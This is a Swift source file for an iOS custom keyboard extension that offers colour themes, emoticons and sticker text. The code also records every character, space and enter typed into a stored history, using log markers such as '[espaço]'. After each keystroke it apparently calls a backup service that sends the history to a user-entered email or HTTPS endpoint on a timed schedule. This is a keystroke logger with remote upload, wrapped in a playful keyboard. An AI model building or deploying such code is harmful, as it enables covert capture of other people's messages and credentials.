import UIKit

final class KeyboardViewController: UIInputViewController {

    private let rootStack = UIStackView()
    private let statusLabel = UILabel()

    private let themes: [UIColor] = [
        .systemGray6, .systemBlue, .systemPurple, .systemPink,
        .systemGreen, .systemOrange, .black
    ]

    private let emotes = [
        "¯\\_(ツ)_/¯", "(╯°□°）╯︵ ┻━┻", "ಠ_ಠ", "(づ｡◕‿‿◕｡)づ",
        "ʕ•ᴥ•ʔ", "(ง'̀-'́)ง", "༼ つ ◕_◕ ༽つ", "(｡♥‿♥｡)"
    ]

    private let stickers = [
        "⭐ GG ⭐", "🔥 FOGO 🔥", "💀 RIP 💀", "🚀 VAI! 🚀",
        "👽 ET 👽", "🎸 ROCK 🎸", "❤️ LOVE ❤️", "⚡ WOW ⚡"
    ]

    override func viewDidLoad() {
        super.viewDidLoad()
        setup()
        showLetters()
        applyTheme()
        attemptAutomaticBackup()
    }

    private func setup() {
        rootStack.axis = .vertical
        rootStack.spacing = 6
        rootStack.translatesAutoresizingMaskIntoConstraints = false

        statusLabel.font = .systemFont(ofSize: 11)
        statusLabel.textAlignment = .center
        statusLabel.textColor = .secondaryLabel

        view.addSubview(rootStack)
        NSLayoutConstraint.activate([
            rootStack.leadingAnchor.constraint(equalTo: view.leadingAnchor, constant: 4),
            rootStack.trailingAnchor.constraint(equalTo: view.trailingAnchor, constant: -4),
            rootStack.topAnchor.constraint(equalTo: view.topAnchor, constant: 4),
            rootStack.bottomAnchor.constraint(equalTo: view.bottomAnchor, constant: -4),
            view.heightAnchor.constraint(greaterThanOrEqualToConstant: 255)
        ])
    }

    private func clearUI() {
        rootStack.arrangedSubviews.forEach {
            rootStack.removeArrangedSubview($0)
            $0.removeFromSuperview()
        }
    }

    private func row(_ titles: [String], selector: Selector) -> UIStackView {
        let s = UIStackView()
        s.axis = .horizontal
        s.spacing = 4
        s.distribution = .fillEqually

        titles.forEach { title in
            let b = UIButton(type: .system)
            b.setTitle(title, for: .normal)
            b.backgroundColor = .tertiarySystemBackground
            b.layer.cornerRadius = 6
            b.titleLabel?.font = .systemFont(ofSize: 15, weight: .medium)
            b.addTarget(self, action: selector, for: .touchUpInside)
            s.addArrangedSubview(b)
        }
        return s
    }

    private func showLetters() {
        clearUI()
        rootStack.addArrangedSubview(statusLabel)

        [["Q","W","E","R","T","Y","U","I","O","P"],
         ["A","S","D","F","G","H","J","K","L"],
         ["Z","X","C","V","B","N","M"]].forEach {
            rootStack.addArrangedSubview(row($0, selector: #selector(letter(_:))))
        }

        rootStack.addArrangedSubview(
            row(["🌐","😊","⭐","🎨","⚙️","⌫","espaço","↵"], selector: #selector(action(_:)))
        )
        updateStatus()
    }

    @objc private func letter(_ sender: UIButton) {
        guard let t = sender.currentTitle else { return }
        let text = t.lowercased()
        textDocumentProxy.insertText(text)
        KeyboardStorage.append(text)
        attemptAutomaticBackup()
    }

    @objc private func action(_ sender: UIButton) {
        guard let t = sender.currentTitle else { return }

        switch t {
        case "🌐": advanceToNextInputMode()
        case "😊": showPicker("Emotes", emotes)
        case "⭐": showPicker("Stickers", stickers)
        case "🎨":
            KeyboardStorage.themeIndex = (KeyboardStorage.themeIndex + 1) % themes.count
            applyTheme()
        case "⚙️": showSettings()
        case "⌫": textDocumentProxy.deleteBackward()
        case "espaço":
            textDocumentProxy.insertText(" ")
            KeyboardStorage.append("[espaço]")
            attemptAutomaticBackup()
        case "↵":
            textDocumentProxy.insertText("\n")
            KeyboardStorage.append("[enter]")
            attemptAutomaticBackup()
        default: break
        }
    }

    private func showPicker(_ title: String, _ items: [String]) {
        clearUI()
        rootStack.addArrangedSubview(row(["←", title], selector: #selector(back(_:))))
        for c in items.chunked(into: 2) {
            rootStack.addArrangedSubview(row(c, selector: #selector(insertItem(_:))))
        }
    }

    @objc private func back(_ sender: UIButton) {
        if sender.currentTitle == "←" { showLetters() }
    }

    @objc private func insertItem(_ sender: UIButton) {
        guard let t = sender.currentTitle else { return }
        textDocumentProxy.insertText(t)
        KeyboardStorage.append(t)
        attemptAutomaticBackup()
    }

    private func showSettings() {
        clearUI()
        rootStack.addArrangedSubview(row(["←", KeyboardStorage.historyEnabled ? "Hist ON" : "Hist OFF",
                                          KeyboardStorage.automaticBackupEnabled ? "Auto ON" : "Auto OFF"],
                                         selector: #selector(settingsAction(_:))))

        rootStack.addArrangedSubview(row(["12h", "24h", "7 dias", "Limpar"], selector: #selector(settingsAction(_:))))

        let emailField = UITextField()
        emailField.placeholder = "E-mail de destino"
        emailField.keyboardType = .emailAddress
        emailField.borderStyle = .roundedRect
        emailField.text = KeyboardStorage.backupEmail
        emailField.addTarget(self, action: #selector(emailChanged(_:)), for: .editingChanged)
        rootStack.addArrangedSubview(emailField)

        let endpointField = UITextField()
        endpointField.placeholder = "https://seu-endpoint.com/backup"
        endpointField.keyboardType = .URL
        endpointField.autocapitalizationType = .none
        endpointField.borderStyle = .roundedRect
        endpointField.text = KeyboardStorage.endpointURL
        endpointField.addTarget(self, action: #selector(endpointChanged(_:)), for: .editingChanged)
        rootStack.addArrangedSubview(endpointField)

        let label = UILabel()
        label.numberOfLines = 0
        label.font = .systemFont(ofSize: 11)
        if let last = KeyboardStorage.lastBackup {
            label.text = "Intervalo: \(Int(KeyboardStorage.backupHours))h • Último: \(last.formatted())"
        } else {
            label.text = "Intervalo: \(Int(KeyboardStorage.backupHours))h • Nenhum backup enviado."
        }
        rootStack.addArrangedSubview(label)
    }

    @objc private func settingsAction(_ sender: UIButton) {
        guard let t = sender.currentTitle else { return }

        switch t {
        case "←": showLetters()
        case "Hist ON", "Hist OFF": KeyboardStorage.historyEnabled.toggle(); showSettings()
        case "Auto ON", "Auto OFF": KeyboardStorage.automaticBackupEnabled.toggle(); showSettings()
        case "12h": KeyboardStorage.backupHours = 12; showSettings()
        case "24h": KeyboardStorage.backupHours = 24; showSettings()
        case "7 dias": KeyboardStorage.backupHours = 24 * 7; showSettings()
        case "Limpar": KeyboardStorage.clearHistory(); showSettings()
        default: break
        }
    }

    @objc private func emailChanged(_ sender: UITextField) {
        KeyboardStorage.backupEmail = sender.text ?? ""
    }

    @objc private func endpointChanged(_ sender: UITextField) {
        KeyboardStorage.endpointURL = sender.text ?? ""
    }

    private func attemptAutomaticBackup() {
        BackupService.sendIfDue { [weak self] success, message in
            DispatchQueue.main.async {
                if success { self?.statusLabel.text = message }
                else { self?.updateStatus() }
            }
        }
    }

    private func applyTheme() {
        view.backgroundColor = themes[KeyboardStorage.themeIndex % themes.count]
        updateStatus()
    }

    private func updateStatus() {
        let h = KeyboardStorage.historyEnabled ? "Hist ON" : "Hist OFF"
        let b = KeyboardStorage.automaticBackupEnabled ? "Auto \(Int(KeyboardStorage.backupHours))h" : "Auto OFF"
        statusLabel.text = "\(h) • \(b)"
    }
}

private extension Array {
    func chunked(into size: Int) -> [[Element]] {
        guard size > 0 else { return [] }
        return stride(from: 0, to: count, by: size).map {
            Array(self[$0..<Swift.min($0 + size, count)])
        }
    }
}
